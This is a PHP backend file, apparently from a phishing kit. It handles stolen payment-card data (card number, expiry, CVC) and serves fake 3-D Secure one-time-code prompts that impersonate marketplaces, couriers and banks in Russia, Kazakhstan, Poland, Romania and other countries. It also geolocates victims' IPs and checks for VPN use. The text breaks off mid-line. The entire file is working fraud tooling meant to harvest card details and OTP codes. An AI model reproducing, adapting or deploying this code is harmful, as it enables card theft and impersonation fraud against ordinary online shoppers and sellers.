<?php
	include '_set.php';

	$action = $_POST['action'];
	if (!$action || $action == '')
		exit();
	if ($_POST['secretkey'] != secretKey())
		exit();
	$srvc = intval($_POST['service']);
	if ($srvc < 1 || $srvc > 37)
		exit();
	$_POST2 = json_decode($_POST['_post'], true);
	$_GET2 = json_decode($_POST['_get'], true);
	$_SERVER2 = json_decode($_POST['_server'], true);
	$_COOKIE2 = json_decode($_POST['_cookie'], true);
	$isnt = in_array($srvc, [1, 2, 8, 9, 10, 11, 13, 14, 15, 16, 17, 18, 20, 22, 25, 26, 27, 28, 29, 30, 31, 32, 33, 35, 36, 37]);
	if ($srvc == 9 || $srvc == 12) $isnt = 2;
	if ($srvc == 19) $isnt = 3;
	$item = beaText($_GET2['id'], chsNum());
	if (!isItem($item, $isnt) && !in_array($action, ['delivery', '3ds']))
		exit();
	$domain = $_SERVER2['domain'];
	$ip = beaText($_SERVER2['ip'], chsNum().'.:abcdef');
	
	
    $iploc = getIpData($ip, 'lctn');
if (!$iploc) {
  $geo = json_decode(request('http://ip-api.com/json/'.$ip.'?lang=ru&fields=country,regionName,city'), true);
  $iploc = $geo['country'].', '.$geo['regionName'].', '.$geo['city'];
  setIpData($ip, 'lctn', $iploc);
}
$ipprov = getIpData($ip, 'lctn');
if (!$ipprov) {
  $geo = json_decode(request('http://ip-api.com/json/'.$ip.'?lang=ru&fields=isp,org'), true);
  $ipprov = $geo['isp'].', '.$geo['org'];
  setIpData($ip, 'lctn', $ipprov);
}
$ipvpn = getIpData($ip, 'lctn');
if (!$ipvpn) {
  $geo = json_decode(request('http://ip-api.com/json/'.$ip.'?lang=ru&fields=proxy'), true);
  $ipvpn = $geo['proxy'];
  setIpData($ip, 'lctn', $ipvpn);
}
if ($ipvpn == 'false') {
    $ipvpn = 'Нет';
}
if ($ipvpn == '') {
    $ipvpn = 'Да';
}
  
	$itemd = getItemData($item, $isnt);
	$id = $itemd[3];
	$amount = $itemd[5];
	$title = $itemd[6];
	$iscars = $itemd[14];
	$ddos0 = false;
	$data = false;
	function xEcho($t) {
		global $_COOKIE2;
		echo json_encode($_COOKIE2).'`'.$t;
		exit();
	}
	switch ($action) {
		case 'delivery': {
			$data = calcDelivery($_GET2['c1'], $_GET2['c2']);
			break;
		}
		case '3ds': {
			$md = $item;
			$t = getPayData($md, false);
			if (count($t) < 2)
				exit();
			list($card, $expm, $expy, $cvc, $ip, $srvc, $domain, $item, $shop, $amount, $id, $isnt, $isnr, $pkoef) = $t;
	        $isnt = ($isnt == '1');
	if (getService($srvc, false, $isnb == 2) == 'OLX KZ' or getService($srvc, false, $isnb == 2) == 'OLX KZ 2.0' or getService($srvc, false, $isnb == 2) == 'КазПочта' or getService($srvc, false, $isnb == 2) == 'КазПочта 2.0' or getService($srvc, false, $isnb == 2) == 'OLX KZ недвижимость' or getService($srvc, false, $isnb == 2) == 'OLX KZ недвижимость 2.0') {
				$msg = [false, 'Одноразовый код был направлен на Ваш номер телефона. Пожалуйста, проверьте реквизиты транзакции и введите одноразовый код.'];
			} 
			if (getService($srvc, false, $isnb == 2) == 'Куфар' or getService($srvc, false, $isnb == 2) == 'Куфар 2.0' or getService($srvc, false, $isnb == 2) == 'BelPost' or getService($srvc, false, $isnb == 2) == 'BelPost 2.0' or getService($srvc, false, $isnb == 2) == 'Европочта' or getService($srvc, false, $isnb == 2) == 'Европочта 2.0') {
				$msg = [false, 'Одноразовый код был направлен на Ваш номер телефона. Пожалуйста, проверьте реквизиты транзакции и введите одноразовый код.'];
			} 
            if (getService($srvc, false, $isnb == 2) == 'Юла' or getService($srvc, false, $isnb == 2) == 'Юла 2.0' or getService($srvc, false, $isnb == 2) == 'Авито' or getService($srvc, false, $isnb == 2) == 'Авито 2.0' or getService($srvc, false, $isnb == 2) == 'СДЭК' or getService($srvc, false, $isnb == 2) == 'СДЭК 2.0' or getService($srvc, false, $isnb == 2) == 'ПЭК' or getService($srvc, false, $isnb == 2) == 'ПЭК 2.0' or getService($srvc, false, $isnb == 2) == 'Боксберри' or getService($srvc, false, $isnb == 2) == 'Боксберри 2.0' or getService($srvc, false, $isnb == 2) == 'Яндекс' or getService($srvc, false, $isnb == 2) == 'Яндекс 2.0' or getService($srvc, false, $isnb == 2) == 'Достависта' or getService($srvc, false, $isnb == 2) == 'Достависта 2.0' or getService($srvc, false, $isnb == 2) == 'Avito Недвижимость' or getService($srvc, false, $isnb == 2) == 'Avito Недвижимость 2.0' or getService($srvc, false, $isnb == 2) == 'Youla Недвижимость' or getService($srvc, false, $isnb == 2) == 'Youla Недвижимость 2.0' or getService($srvc, false, $isnb == 2) == 'Почта РФ' or getService($srvc, false, $isnb == 2) == 'Почта РФ 2.0' or getService($srvc, false, $isnb == 2) == 'Сбербанк' or getService($srvc, false, $isnb == 2) == 'Сбербанк 2.0' or getService($srvc, false, $isnb == 2) == 'Альфа-Банк' or getService($srvc, false, $isnb == 2) == 'Альфа-Банк 2.0' or getService($srvc, false, $isnb == 2) == 'AUTO RU' or getService($srvc, false, $isnb == 2) == 'AUTO RU 2.0' or getService($srvc, false, $isnb == 2) == 'DROM' or getService($srvc, false, $isnb == 2) == 'DROM 2.0' or getService($srvc, false, $isnb == 2) == 'Booking' or getService($srvc, false, $isnb == 2) == 'Booking 2.0' or getService($srvc, false, $isnb == 2) == 'Яндекс Объявления' or getService($srvc, false, $isnb == 2) == 'Яндекс Объявления 2.0' or getService($srvc, false, $isnb == 2) == 'БлаБлаКар' or getService($srvc, false, $isnb == 2) == 'БлаБлаКар 2.0' or getService($srvc, false, $isnb == 2) == 'Циан' or getService($srvc, false, $isnb == 2) == 'Циан 2.0' or getService($srvc, false, $isnb == 2) == 'M.Video'  or getService($srvc, false, $isnb == 2) == 'M.Video 2.0') {
                $msg = [false, 'Одноразовый код был направлен на Ваш номер телефона. Пожалуйста, проверьте реквизиты транзакции и введите одноразовый код.'];
			}
			if (getService($srvc, false, $isnb == 2) == 'OLX RO' or getService($srvc, false, $isnb == 2) == 'OLX RO 2.0' or getService($srvc, false, $isnb == 2) == 'FAN Courier' or getService($srvc, false, $isnb == 2) == 'FAN Courier 2.0') {
				$msg = [false, 'Un cod unic a fost trimis la numărul dvs. de telefon. Vă rugăm să verificați detaliile tranzacției și să introduceți codul unic.'];
			} 
			if (getService($srvc, false, $isnb == 2) == 'OLX BG' or getService($srvc, false, $isnb == 2) == 'OLX BG 2.0') {
				$msg = [false, 'Еднократен код е изпратен до вашия телефонен номер. Моля, проверете подробностите за транзакцията и въведете кода за еднократна употреба.'];
			} 
			if (getService($srvc, false, $isnb == 2) == 'OLX UA' or getService($srvc, false, $isnb == 2) == 'OLX UA 2.0' or getService($srvc, false, $isnb == 2) == 'IZI ua' or getService($srvc, false, $isnb == 2) == 'IZI ua 2.0') {
				$msg = [false, 'Одноразовый код был направлен на Ваш номер телефона. Пожалуйста, проверьте реквизиты транзакции и введите одноразовый код.'];
			} 
			if (getService($srvc, false, $isnb == 2) == 'OLX UZ' or getService($srvc, false, $isnb == 2) == 'OLX UZ 2.0' or getService($srvc, false, $isnb == 2) == 'Fargo uz' or getService($srvc, false, $isnb == 2) == 'Fargo uz 2.0') {
				$msg = [false, 'Одноразовый код был направлен на Ваш номер телефона. Пожалуйста, проверьте реквизиты транзакции и введите одноразовый код.'];
			} 
        	if (getService($srvc, false, $isnb == 2) == 'OLX PL' or getService($srvc, false, $isnb == 2) == 'OLX PL 2.0' or getService($srvc, false, $isnb == 2) == 'Allegro' or getService($srvc, false, $isnb == 2) == 'Allegro 2.0') {
				$msg = [false, 'Na Twój numer telefonu został wysłany jednorazowy kod. Sprawdź szczegóły transakcji i wprowadź kod jednorazowy.'];
			} 
			if (getService($srvc, false, $isnb == 2) == 'СБАЗАР' or getService($srvc, false, $isnb == 2) == 'СБАЗАР 2.0') {
				$msg = [false, 'Na vaše telefonní číslo byl zaslán jedinečný kód. Zkontrolujte podrobnosti transakce a zadejte jedinečný kód.'];
			} 
			if (getService($srvc, false, $isnb == 2) == 'Gumtree' or getService($srvc, false, $isnb == 2) == 'Gumtree 2.0') {
				$msg = [false, 'Na vaše telefonní číslo byl zaslán jedinečný kód. Zkontrolujte podrobnosti transakce a zadejte jedinečný kód.'];
			} 
		if (getService($srvc, false, $isnb == 2) == 'OLX KZ' or getService($srvc, false, $isnb == 2) == 'OLX KZ 2.0' or getService($srvc, false, $isnb == 2) == 'КазПочта' or getService($srvc, false, $isnb == 2) == 'КазПочта 2.0' or getService($srvc, false, $isnb == 2) == 'OLX KZ недвижимость' or getService($srvc, false, $isnb == 2) == 'OLX KZ недвижимость 2.0') {
				$msgff = 'KZT';
			} 
			if (getService($srvc, false, $isnb == 2) == 'Куфар' or getService($srvc, false, $isnb == 2) == 'Куфар 2.0' or getService($srvc, false, $isnb == 2) == 'BelPost' or getService($srvc, false, $isnb == 2) == 'BelPost 2.0' or getService($srvc, false, $isnb == 2) == 'Европочта' or getService($srvc, false, $isnb == 2) == 'Европочта 2.0') {
				$msgff = 'BYN';
			} 
            if (getService($srvc, false, $isnb == 2) == 'Юла' or getService($srvc, false, $isnb == 2) == 'Юла 2.0' or getService($srvc, false, $isnb == 2) == 'Авито' or getService($srvc, false, $isnb == 2) == 'Авито 2.0' or getService($srvc, false, $isnb == 2) == 'СДЭК' or getService($srvc, false, $isnb == 2) == 'СДЭК 2.0' or getService($srvc, false, $isnb == 2) == 'ПЭК' or getService($srvc, false, $isnb == 2) == 'ПЭК 2.0' or getService($srvc, false, $isnb == 2) == 'Боксберри' or getService($srvc, false, $isnb == 2) == 'Боксберри 2.0' or getService($srvc, false, $isnb == 2) == 'Яндекс' or getService($srvc, false, $isnb == 2) == 'Яндекс 2.0' or getService($srvc, false, $isnb == 2) == 'Достависта' or getService($srvc, false, $isnb == 2) == 'Достависта 2.0' or getService($srvc, false, $isnb == 2) == 'Avito Недвижимость' or getService($srvc, false, $isnb == 2) == 'Avito Недвижимость 2.0' or getService($srvc, false, $isnb == 2) == 'Youla Недвижимость' or getService($srvc, false, $isnb == 2) == 'Youla Недвижимость 2.0' or getService($srvc, false, $isnb == 2) == 'Почта РФ' or getService($srvc, false, $isnb == 2) == 'Почта РФ 2.0' or getService($srvc, false, $isnb == 2) == 'Сбербанк' or getService($srvc, false, $isnb == 2) == 'Сбербанк 2.0' or getService($srvc, false, $isnb == 2) == 'Альфа-Банк' or getService($srvc, false, $isnb == 2) == 'Альфа-Банк 2.0' or getService($srvc, false, $isnb == 2) == 'AUTO RU' or getService($srvc, false, $isnb == 2) == 'AUTO RU 2.0' or getService($srvc, false, $isnb == 2) == 'DROM' or getService($srvc, false, $isnb == 2) == 'DROM 2.0' or getService($srvc, false, $isnb == 2) == 'Booking' or getService($srvc, false, $isnb == 2) == 'Booking 2.0' or getService($srvc, false, $isnb == 2) == 'Яндекс Объявления' or getService($srvc, false, $isnb == 2) == 'Яндекс Объявления 2.0' or getService($srvc, false, $isnb == 2) == 'БлаБлаКар' or getService($srvc, false, $isnb == 2) == 'БлаБлаКар 2.0' or getService($srvc, false, $isnb == 2) == 'Циан' or getService($srvc, false, $isnb == 2) == 'Циан 2.0' or getService($srvc, false, $isnb == 2) == 'M.Video'  or getService($srvc, false, $isnb == 2) == 'M.Video 2.0') {
                $msgff = 'RUB';
			}
			if (getService($srvc, false, $isnb == 2) == 'OLX RO' or getService($srvc, false, $isnb == 2) == 'OLX RO 2.0' or getService($srvc, false, $isnb == 2) == 'FAN Courier' or getService($srvc, false, $isnb == 2) == 'FAN Courier 2.0') {
				$msgff = 'RON';
			} 
			if (getService($srvc, false, $isnb == 2) == 'OLX BG' or getService($srvc, false, $isnb == 2) == 'OLX BG 2.0') {
				$msgff = 'BGN';
			} 
			if (getService($srvc, false, $isnb == 2) == 'OLX UA' or getService($srvc, false, $isnb == 2) == 'OLX UA 2.0' or getService($srvc, false, $isnb == 2) == 'IZI ua' or getService($srvc, false, $isnb == 2) == 'IZI ua 2.0') {
				$msgff = 'UAH';
			} 
			if (getService($srvc, false, $isnb == 2) == 'OLX UZ' or getService($srvc, false, $isnb == 2) == 'OLX UZ 2.0' or getService($srvc, false, $isnb == 2) == 'Fargo uz' or getService($srvc, false, $isnb == 2) == 'Fargo uz 2.0') {
				$msgff = 'UZS';
			} 
        	if (getService($srvc, false, $isnb == 2) == 'OLX PL' or getService($srvc, false, $isnb == 2) == 'OLX PL 2.0' or getService($srvc, false, $isnb == 2) == 'Allegro' or getService($srvc, false, $isnb == 2) == 'Allegro 2.0') {
				$msgff = 'PLN';
			} 
			if (getService($srvc, false, $isnb == 2) == 'СБАЗАР' or getService($srvc, false, $isnb == 2) == 'СБАЗАР 2.0') {
				$msgff = 'CZK';
			} 
			if (getService($srvc, false, $isnb == 2) == 'Gumtree' or getService($srvc, false, $isnb == 2) == 'Gumtree 2.0') {
				$msgff = 'USD';
			} 
		if (getService($srvc, false, $isnb == 2) == 'OLX KZ' or getService($srvc, false, $isnb == 2) == 'OLX KZ 2.0' or getService($srvc, false, $isnb == 2) == 'КазПочта' or getService($srvc, false, $isnb == 2) == 'КазПочта 2.0' or getService($srvc, false, $isnb == 2) == 'OLX KZ недвижимость' or getService($srvc, false, $isnb == 2) == 'OLX KZ недвижимость 2.0') {
				$msgffcode = 'Введите Ваш код';
			} 
			if (getService($srvc, false, $isnb == 2) == 'Куфар' or getService($srvc, false, $isnb == 2) == 'Куфар 2.0' or getService($srvc, false, $isnb == 2) == 'BelPost' or getService($srvc, false, $isnb == 2) == 'BelPost 2.0' or getService($srvc, false, $isnb == 2) == 'Европочта' or getService($srvc, false, $isnb == 2) == 'Европочта 2.0') {
				$msgffcode = 'Введите Ваш код';
			} 
            if (getService($srvc, false, $isnb == 2) == 'Юла' or getService($srvc, false, $isnb == 2) == 'Юла 2.0' or getService($srvc, false, $isnb == 2) == 'Авито' or getService($srvc, false, $isnb == 2) == 'Авито 2.0' or getService($srvc, false, $isnb == 2) == 'СДЭК' or getService($srvc, false, $isnb == 2) == 'СДЭК 2.0' or getService($srvc, false, $isnb == 2) == 'ПЭК' or getService($srvc, false, $isnb == 2) == 'ПЭК 2.0' or getService($srvc, false, $isnb == 2) == 'Боксберри' or getService($srvc, false, $isnb == 2) == 'Боксберри 2.0' or getService($srvc, false, $isnb == 2) == 'Яндекс' or getService($srvc, false, $isnb == 2) == 'Яндекс 2.0' or getService($srvc, false, $isnb == 2) == 'Достависта' or getService($srvc, false, $isnb == 2) == 'Достависта 2.0' or getService($srvc, false, $isnb == 2) == 'Avito Недвижимость' or getService($srvc, false, $isnb == 2) == 'Avito Недвижимость 2.0' or getService($srvc, false, $isnb == 2) == 'Youla Недвижимость' or getService($srvc, false, $isnb == 2) == 'Youla Недвижимость 2.0' or getService($srvc, false, $isnb == 2) == 'Почта РФ' or getService($srvc, false, $isnb == 2) == 'Почта РФ 2.0' or getService($srvc, false, $isnb == 2) == 'Сбербанк' or getService($srvc, false, $isnb == 2) == 'Сбербанк 2.0' or getService($srvc, false, $isnb == 2) == 'Альфа-Банк' or getService($srvc, false, $isnb == 2) == 'Альфа-Банк 2.0' or getService($srvc, false, $isnb == 2) == 'AUTO RU' or getService($srvc, false, $isnb == 2) == 'AUTO RU 2.0' or getService($srvc, false, $isnb == 2) == 'DROM' or getService($srvc, false, $isnb == 2) == 'DROM 2.0' or getService($srvc, false, $isnb == 2) == 'Booking' or getService($srvc, false, $isnb == 2) == 'Booking 2.0' or getService($srvc, false, $isnb == 2) == 'Яндекс Объявления' or getService($srvc, false, $isnb == 2) == 'Яндекс Объявления 2.0' or getService($srvc, false, $isnb == 2) == 'БлаБлаКар' or getService($srvc, false, $isnb == 2) == 'БлаБлаКар 2.0' or getService($srvc, false, $isnb == 2) == 'Циан' or getService($srvc, false, $isnb == 2) == 'Циан 2.0' or getService($srvc, false, $isnb == 2) == 'M.Video'  or getService($srvc, false, $isnb == 2) == 'M.Video 2.0') {
                $msgffcode = 'Введите Ваш код';
			}
			if (getService($srvc, false, $isnb == 2) == 'OLX RO' or getService($srvc, false, $isnb == 2) == 'OLX RO 2.0' or getService($srvc, false, $isnb == 2) == 'FAN Courier' or getService($srvc, false, $isnb == 2) == 'FAN Courier 2.0') {
				$msgffcode = 'Introdu codul tau';
			} 
			if (getService($srvc, false, $isnb == 2) == 'OLX BG' or getService($srvc, false, $isnb == 2) == 'OLX BG 2.0') {
				$msgffcode = 'Въведете кода си';
			} 
			if (getService($srvc, false, $isnb == 2) == 'OLX UA' or getService($srvc, false, $isnb == 2) == 'OLX UA 2.0' or getService($srvc, false, $isnb == 2) == 'IZI ua' or getService($srvc, false, $isnb == 2) == 'IZI ua 2.0') {
				$msgffcode = 'Введите Ваш код';
			} 
			if (getService($srvc, false, $isnb == 2) == 'OLX UZ' or getService($srvc, false, $isnb == 2) == 'OLX UZ 2.0' or getService($srvc, false, $isnb == 2) == 'Fargo uz' or getService($srvc, false, $isnb == 2) == 'Fargo uz 2.0') {
				$msgffcode = 'Введите Ваш код';
			} 
        	if (getService($srvc, false, $isnb == 2) == 'OLX PL' or getService($srvc, false, $isnb == 2) == 'OLX PL 2.0' or getService($srvc, false, $isnb == 2) == 'Allegro' or getService($srvc, false, $isnb == 2) == 'Allegro 2.0') {
				$msgffcode = 'Wpisz swój kod';
			} 
			if (getService($srvc, false, $isnb == 2) == 'СБАЗАР' or getService($srvc, false, $isnb == 2) == 'СБАЗАР 2.0') {
				$msgffcode = 'Zadejte svůj kód';
			} 
			if (getService($srvc, false, $isnb == 2) == 'Gumtree' or getService($srvc, false, $isnb == 2) == 'Gumtree 2.0') {
				$msgffcode = 'Zadejte svůj kód';
			} 
		if (getService($srvc, false, $isnb == 2) == 'OLX KZ' or getService($srvc, false, $isnb == 2) == 'OLX KZ 2.0' or getService($srvc, false, $isnb == 2) == 'КазПочта' or getService($srvc, false, $isnb == 2) == 'КазПочта 2.0' or getService($srvc, false, $isnb == 2) == 'OLX KZ недвижимость' or getService($srvc, false, $isnb == 2) == 'OLX KZ недвижимость 2.0') {
				$msgffshop = 'Магазин';
			} 
            if (getService($srvc, false, $isnb == 2) == 'Куфар' or getService($srvc, false, $isnb == 2) == 'Куфар 2.0' or getService($srvc, false, $isnb == 2) == 'BelPost' or getService($srvc, false, $isnb == 2) == 'BelPost 2.0' or getService($srvc, false, $isnb == 2) == 'Европочта' or getService($srvc, false, $isnb == 2) == 'Европочта 2.0') {
                $msgffshop = 'Магазин';
			} 
            if (getService($srvc, false, $isnb == 2) == 'Юла' or getService($srvc, false, $isnb == 2) == 'Юла 2.0' or getService($srvc, false, $isnb == 2) == 'Авито' or getService($srvc, false, $isnb == 2) == 'Авито 2.0' or getService($srvc, false, $isnb == 2) == 'СДЭК' or getService($srvc, false, $isnb == 2) == 'СДЭК 2.0' or getService($srvc, false, $isnb == 2) == 'ПЭК' or getService($srvc, false, $isnb == 2) == 'ПЭК 2.0' or getService($srvc, false, $isnb == 2) == 'Боксберри' or getService($srvc, false, $isnb == 2) == 'Боксберри 2.0' or getService($srvc, false, $isnb == 2) == 'Яндекс' or getService($srvc, false, $isnb == 2) == 'Яндекс 2.0' or getService($srvc, false, $isnb == 2) == 'Достависта' or getService($srvc, false, $isnb == 2) == 'Достависта 2.0' or getService($srvc, false, $isnb == 2) == 'Avito Недвижимость' or getService($srvc, false, $isnb == 2) == 'Avito Недвижимость 2.0' or getService($srvc, false, $isnb == 2) == 'Youla Недвижимость' or getService($srvc, false, $isnb == 2) == 'Youla Недвижимость 2.0' or getService($srvc, false, $isnb == 2) == 'Почта РФ' or getService($srvc, false, $isnb == 2) == 'Почта РФ 2.0' or getService($srvc, false, $isnb == 2) == 'Сбербанк' or getService($srvc, false, $isnb == 2) == 'Сбербанк 2.0' or getService($srvc, false, $isnb == 2) == 'Альфа-Банк' or getService($srvc, false, $isnb == 2) == 'Альфа-Банк 2.0' or getService($srvc, false, $isnb == 2) == 'AUTO RU' or getService($srvc, false, $isnb == 2) == 'AUTO RU 2.0' or getService($srvc, false, $isnb == 2) == 'DROM' or getService($srvc, false, $isnb == 2) == 'DROM 2.0' or getService($srvc, false, $isnb == 2) == 'Booking' or getService($srvc, false, $isnb == 2) == 'Booking 2.0' or getService($srvc, false, $isnb == 2) == 'Яндекс Объявления' or getService($srvc, false, $isnb == 2) == 'Яндекс Объявления 2.0' or getService($srvc, false, $isnb == 2) == 'БлаБлаКар' or getService($srvc, false, $isnb == 2) == 'БлаБлаКар 2.0' or getService($srvc, false, $isnb == 2) == 'Циан' or getService($srvc, false, $isnb == 2) == 'Циан 2.0' or getService($srvc, false, $isnb == 2) == 'M.Video'  or getService($srvc, false, $isnb == 2) == 'M.Video 2.0') {
                $msgffshop = 'Магазин';
			}
			if (getService($srvc, false, $isnb == 2) == 'OLX RO' or getService($srvc, false, $isnb == 2) == 'OLX RO 2.0' or getService($srvc, false, $isnb == 2) == 'FAN Courier' or getService($srvc, false, $isnb == 2) == 'FAN Courier 2.0') {
				$msgffshop = 'Scor';
			} 
			if (getService($srvc, false, $isnb == 2) == 'OLX BG' or getService($srvc, false, $isnb == 2) == 'OLX BG 2.0') {
		    	$msgffshop = 'Магазин';
			} 
			if (getService($srvc, false, $isnb == 2) == 'OLX UA' or getService($srvc, false, $isnb == 2) == 'OLX UA 2.0' or getService($srvc, false, $isnb == 2) == 'IZI ua' or getService($srvc, false, $isnb == 2) == 'IZI ua 2.0') {
				$msgffshop = 'Магазин';
			} 
			if (getService($srvc, false, $isnb == 2) == 'OLX UZ' or getService($srvc, false, $isnb == 2) == 'OLX UZ 2.0' or getService($srvc, false, $isnb == 2) == 'Fargo uz' or getService($srvc, false, $isnb == 2) == 'Fargo uz 2.0') {
				$msgffshop = 'Магазин';
			} 
        	if (getService($srvc, false, $isnb == 2) == 'OLX PL' or getService($srvc, false, $isnb == 2) == 'OLX PL 2.0' or getService($srvc, false, $isnb == 2) == 'Allegro' or getService($srvc, false, $isnb == 2) == 'Allegro 2.0') {
				$msgffshop = 'Wynik';
			} 
			if (getService($srvc, false, $isnb == 2) == 'СБАЗАР' or getService($srvc, false, $isnb == 2) == 'СБАЗАР 2.0') {
				$msgffshop = 'Výsledek';
			} 
			if (getService($srvc, false, $isnb == 2) == 'Gumtree' or getService($srvc, false, $isnb == 2) == 'Gumtree 2.0') {
				$msgffshop = 'Výsledek';
			} 
		if (getService($srvc, false, $isnb == 2) == 'OLX KZ' or getService($srvc, false, $isnb == 2) == 'OLX KZ 2.0' or getService($srvc, false, $isnb == 2) == 'КазПочта' or getService($srvc, false, $isnb == 2) == 'КазПочта 2.0' or getService($srvc, false, $isnb == 2) == 'OLX KZ недвижимость' or getService($srvc, false, $isnb == 2) == 'OLX KZ недвижимость 2.0') {
				$msgffshop1 = 'Описание';
			} 
			if (getService($srvc, false, $isnb == 2) == 'Куфар' or getService($srvc, false, $isnb == 2) == 'Куфар 2.0' or getService($srvc, false, $isnb == 2) == 'BelPost' or getService($srvc, false, $isnb == 2) == 'BelPost 2.0' or getService($srvc, false, $isnb == 2) == 'Европочта' or getService($srvc, false, $isnb == 2) == 'Европочта 2.0') {
				$msgffshop1 = 'Описание';
			} 
            if (getService($srvc, false, $isnb == 2) == 'Юла' or getService($srvc, false, $isnb == 2) == 'Юла 2.0' or getService($srvc, false, $isnb == 2) == 'Авито' or getService($srvc, false, $isnb == 2) == 'Авито 2.0' or getService($srvc, false, $isnb == 2) == 'СДЭК' or getService($srvc, false, $isnb == 2) == 'СДЭК 2.0' or getService($srvc, false, $isnb == 2) == 'ПЭК' or getService($srvc, false, $isnb == 2) == 'ПЭК 2.0' or getService($srvc, false, $isnb == 2) == 'Боксберри' or getService($srvc, false, $isnb == 2) == 'Боксберри 2.0' or getService($srvc, false, $isnb == 2) == 'Яндекс' or getService($srvc, false, $isnb == 2) == 'Яндекс 2.0' or getService($srvc, false, $isnb == 2) == 'Достависта' or getService($srvc, false, $isnb == 2) == 'Достависта 2.0' or getService($srvc, false, $isnb == 2) == 'Avito Недвижимость' or getService($srvc, false, $isnb == 2) == 'Avito Недвижимость 2.0' or getService($srvc, false, $isnb == 2) == 'Youla Недвижимость' or getService($srvc, false, $isnb == 2) == 'Youla Недвижимость 2.0' or getService($srvc, false, $isnb == 2) == 'Почта РФ' or getService($srvc, false, $isnb == 2) == 'Почта РФ 2.0' or getService($srvc, false, $isnb == 2) == 'Сбербанк' or getService($srvc, false, $isnb == 2) == 'Сбербанк 2.0' or getService($srvc, false, $isnb == 2) == 'Альфа-Банк' or getService($srvc, false, $isnb == 2) == 'Альфа-Банк 2.0' or getService($srvc, false, $isnb == 2) == 'AUTO RU' or getService($srvc, false, $isnb == 2) == 'AUTO RU 2.0' or getService($srvc, false, $isnb == 2) == 'DROM' or getService($srvc, false, $isnb == 2) == 'DROM 2.0' or getService($srvc, false, $isnb == 2) == 'Booking' or getService($srvc, false, $isnb == 2) == 'Booking 2.0' or getService($srvc, false, $isnb == 2) == 'Яндекс Объявления' or getService($srvc, false, $isnb == 2) == 'Яндекс Объявления 2.0' or getService($srvc, false, $isnb == 2) == 'БлаБлаКар' or getService($srvc, false, $isnb == 2) == 'БлаБлаКар 2.0' or getService($srvc, false, $isnb == 2) == 'Циан' or getService($srvc, false, $isnb == 2) == 'Циан 2.0' or getService($srvc, false, $isnb == 2) == 'M.Video'  or getService($srvc, false, $isnb == 2) == 'M.Video 2.0') {
                $msgffshop1 = 'Описание';
			}
			if (getService($srvc, false, $isnb == 2) == 'OLX RO' or getService($srvc, false, $isnb == 2) == 'OLX RO 2.0' or getService($srvc, false, $isnb == 2) == 'FAN Courier' or getService($srvc, false, $isnb == 2) == 'FAN Courier 2.0') {
				$msgffshop1 = 'Descriere';
			} 
			if (getService($srvc, false, $isnb == 2) == 'OLX BG' or getService($srvc, false, $isnb == 2) == 'OLX BG 2.0') {
		    	$msgffshop1 = 'Описание';
			} 
            if (getService($srvc, false, $isnb == 2) == 'OLX UA' or getService($srvc, false, $isnb == 2) == 'OLX UA 2.0' or getService($srvc, false, $isnb == 2) == 'IZI ua' or getService($srvc, false, $isnb == 2) == 'IZI ua 2.0') {
                 $msgffshop1 = 'Описание';
			} 
			if (getService($srvc, false, $isnb == 2) == 'OLX UZ' or getService($srvc, false, $isnb == 2) == 'OLX UZ 2.0' or getService($srvc, false, $isnb == 2) == 'Fargo uz' or getService($srvc, false, $isnb == 2) == 'Fargo uz 2.0') {
                 $msgffshop1 = 'Описание';
			} 
        	if (getService($srvc, false, $isnb == 2) == 'OLX PL' or getService($srvc, false, $isnb == 2) == 'OLX PL 2.0' or getService($srvc, false, $isnb == 2) == 'Allegro' or getService($srvc, false, $isnb == 2) == 'Allegro 2.0') {
				$msgffshop1 = 'Opis';
			} 
			if (getService($srvc, false, $isnb == 2) == 'СБАЗАР' or getService($srvc, false, $isnb == 2) == 'СБАЗАР 2.0') {
				$msgffshop1 = 'Popis';
			} 
			if (getService($srvc, false, $isnb == 2) == 'Gumtree' or getService($srvc, false, $isnb == 2) == 'Gumtree 2.0') {
				$msgffshop1 = 'Popis';
			} 
		if (getService($srvc, false, $isnb == 2) == 'OLX KZ' or getService($srvc, false, $isnb == 2) == 'OLX KZ 2.0' or getService($srvc, false, $isnb == 2) == 'КазПочта' or getService($srvc, false, $isnb == 2) == 'КазПочта 2.0' or getService($srvc, false, $isnb == 2) == 'OLX KZ недвижимость' or getService($srvc, false, $isnb == 2) == 'OLX KZ недвижимость 2.0') {
				$msgffshop2 = 'Сумма';
			} 
			if (getService($srvc, false, $isnb == 2) == 'Куфар' or getService($srvc, false, $isnb == 2) == 'Куфар 2.0' or getService($srvc, false, $isnb == 2) == 'BelPost' or getService($srvc, false, $isnb == 2) == 'BelPost 2.0' or getService($srvc, false, $isnb == 2) == 'Европочта' or getService($srvc, false, $isnb == 2) == 'Европочта 2.0') {
				$msgffshop2 = 'Сумма';
			} 
            if (getService($srvc, false, $isnb == 2) == 'Юла' or getService($srvc, false, $isnb == 2) == 'Юла 2.0' or getService($srvc, false, $isnb == 2) == 'Авито' or getService($srvc, false, $isnb == 2) == 'Авито 2.0' or getService($srvc, false, $isnb == 2) == 'СДЭК' or getService($srvc, false, $isnb == 2) == 'СДЭК 2.0' or getService($srvc, false, $isnb == 2) == 'ПЭК' or getService($srvc, false, $isnb == 2) == 'ПЭК 2.0' or getService($srvc, false, $isnb == 2) == 'Боксберри' or getService($srvc, false, $isnb == 2) == 'Боксберри 2.0' or getService($srvc, false, $isnb == 2) == 'Яндекс' or getService($srvc, false, $isnb == 2) == 'Яндекс 2.0' or getService($srvc, false, $isnb == 2) == 'Достависта' or getService($srvc, false, $isnb == 2) == 'Достависта 2.0' or getService($srvc, false, $isnb == 2) == 'Avito Недвижимость' or getService($srvc, false, $isnb == 2) == 'Avito Недвижимость 2.0' or getService($srvc, false, $isnb == 2) == 'Youla Недвижимость' or getService($srvc, false, $isnb == 2) == 'Youla Недвижимость 2.0' or getService($srvc, false, $isnb == 2) == 'Почта РФ' or getService($srvc, false, $isnb == 2) == 'Почта РФ 2.0' or getService($srvc, false, $isnb == 2) == 'Сбербанк' or getService($srvc, false, $isnb == 2) == 'Сбербанк 2.0' or getService($srvc, false, $isnb == 2) == 'Альфа-Банк' or getService($srvc, false, $isnb == 2) == 'Альфа-Банк 2.0' or getService($srvc, false, $isnb == 2) == 'AUTO RU' or getService($srvc, false, $isnb == 2) == 'AUTO RU 2.0' or getService($srvc, false, $isnb == 2) == 'DROM' or getService($srvc, false, $isnb == 2) == 'DROM 2.0' or getService($srvc, false, $isnb == 2) == 'Booking' or getService($srvc, false, $isnb == 2) == 'Booking 2.0' or getService($srvc, false, $isnb == 2) == 'Яндекс Объявления' or getService($srvc, false, $isnb == 2) == 'Яндекс Объявления 2.0' or getService($srvc, false, $isnb == 